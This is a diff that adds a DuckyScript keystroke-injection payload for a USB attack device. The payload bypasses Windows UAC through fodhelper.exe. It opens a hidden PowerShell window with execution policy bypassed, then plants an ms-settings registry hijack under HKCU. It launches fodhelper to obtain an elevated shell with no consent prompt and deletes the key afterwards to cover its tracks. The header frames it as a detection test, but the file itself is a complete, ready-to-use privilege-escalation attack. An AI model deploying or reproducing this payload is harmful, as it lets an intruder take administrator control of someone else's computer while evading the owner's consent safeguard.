@@ -1,0 +1,23 @@
+REM ============================================================
+REM  Windows · UAC Bypass (fodhelper.exe)
+REM ============================================================
+REM  Uses the fodhelper.exe auto-elevate bypass to open an
+REM  elevated command prompt without triggering a UAC dialog.
+REM  Works on Windows 10/11 with default UAC settings.
+REM
+REM  Tests whether UAC bypass techniques are detected.
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1500
+STRINGLN New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
+STRINGLN Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "powershell -ep bypass" -Force
+STRINGLN New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
+STRINGLN Start-Process fodhelper.exe
+DELAY 2000
+STRINGLN Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+STRINGLN exit
